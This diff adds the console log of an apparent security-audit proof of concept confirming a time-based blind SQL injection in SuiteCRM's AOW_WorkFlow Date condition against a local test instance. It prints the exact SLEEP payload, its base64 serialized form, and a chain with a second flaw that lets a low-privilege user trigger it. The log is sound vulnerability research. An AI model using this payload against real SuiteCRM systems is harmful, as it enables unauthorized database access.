@@ -1,0 +1,39 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-018/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-018/../.venv
+========================================================================
+VULN-018: AOW_WorkFlow Date-condition DATE_ADD() interval SQLi (time-based blind)
+target: http://localhost:33116
+========================================================================
+[SETUP] admin session (workflow AUTHORING is admin-gated -- authoring as admin by design)
+[STEP] baseline: time action=testFlow BEFORE our workflow exists (T0)
+[INFO] testFlow [T0 before] sample 1/2 status=200 elapsed=0.06s
+[INFO] testFlow [T0 before] sample 2/2 status=200 elapsed=0.05s
+[INFO] testFlow [T0 before] min elapsed = 0.05s
+[STEP] admin authors one Active AOW_WorkFlow with an injected Date condition (flow_module=AOK_KnowledgeBase, 1 live row)
+[INFO] workflow id=d3f82a9e-72ae-4fc7-976d-9d45cf8259e0; condition value[3] (interval unit) = "DAY), '%Y-%m-%d') OR (SELECT SLEEP(3))#"
+[INFO] base64(serialize(['now','plus','1', PAYLOAD])) = YTo0OntpOjA7czozOiJub3ciO2k6MTtzOjQ6InBsdXMiO2k6MjtzOjE6IjEiO2k6MztzOjM5OiJEQVkpLCAnJVktJW0tJWQnKSBPUiAoU0VMRUNUIFNMRUVQKDMpKSMiO30=
+[STEP] confirming aow_conditions.value round-trips to exactly our base64 blob (db-side verification, not the attack)
+[INFO] db row:
+id	aow_workflow_id	value_type	value
+1c762c77-ddbf-4c87-9c62-92bcb2a49b80	d3f82a9e-72ae-4fc7-976d-9d45cf8259e0	Date	YTo0OntpOjA7czozOiJub3ciO2k6MTtzOjQ6InBsdXMiO2k6MjtzOjE6IjEiO2k6MztzOjM5OiJEQVkpLCAnJVktJW0tJWQnKSBPUiAoU0VMRUNUIFNMRUVQKDMpKSMiO30=
+mysql: [Warning] Using a password on the command line interface can be insecure.
+[PROOF] aow_conditions.value stored byte-for-byte as our base64 blob -- confirms unserialize(base64_decode(...)) will hand build_query_where() our raw, unfiltered params2/params3
+[INFO] live row count of aok_knowledgebase = 2 (SLEEP() is evaluated once per row -- see module docstring); scaling expected delay by this
+[STEP] admin triggers execution: time action=testFlow with our workflow Active (T1)
+[INFO] testFlow [T1 admin-triggered, workflow Active] sample 1/2 status=200 elapsed=6.10s
+[INFO] testFlow [T1 admin-triggered, workflow Active] sample 2/2 status=200 elapsed=6.15s
+[INFO] testFlow [T1 admin-triggered, workflow Active] min elapsed = 6.10s
+[STEP] VULN-026 chaining: a NON-ADMIN user triggers the SAME admin-authored injected workflow
+[OK] low-priv user mod_5533c3f2 logged in (testFlow has no is_admin/ACL check -- controller.php:633-642)
+[INFO] testFlow [T2 LOW-PRIV triggered, workflow Active] sample 1/2 status=200 elapsed=6.22s
+[INFO] testFlow [T2 LOW-PRIV triggered, workflow Active] sample 2/2 status=200 elapsed=6.06s
+[INFO] testFlow [T2 LOW-PRIV triggered, workflow Active] min elapsed = 6.06s
+[STEP] deactivating the workflow and re-timing action=testFlow (T3) to prove causality
+[INFO] testFlow [T3 admin-triggered, workflow Inactive] sample 1/2 status=200 elapsed=0.09s
+[INFO] testFlow [T3 admin-triggered, workflow Inactive] sample 2/2 status=200 elapsed=0.05s
+[INFO] testFlow [T3 admin-triggered, workflow Inactive] min elapsed = 0.05s
+[INFO] timing table written to evidence/timing_table.txt
+[INFO] expected delta (row_count=2 x SLEEP(3)) ~= 6.0s, tolerance (3.0, 12.100000000000001)
+[STEP] asserting the real security effect: a measured SLEEP delay caused specifically by our workflow -- never just HTTP 200
+[PROOF] T0=0.05s -> T1(active)=6.10s (+6.05s) -> T2(low-priv trigger, active)=6.06s (+6.01s vs T0) -> T3(deactivated)=0.05s (back down by 6.05s). The delay appears exactly when our injected workflow is Active and disappears when it is deactivated, and fires identically for an unprivileged trigger -- proving build_query_where() executes the raw DATE_ADD(...) interval we supplied.
+==> VULN-018: CONFIRMED — workflow d3f82a9e-72ae-4fc7-976d-9d45cf8259e0: T0=0.05s, admin-trigger +6.05s, low-priv-trigger +6.01s (VULN-026), deactivated back -6.05s
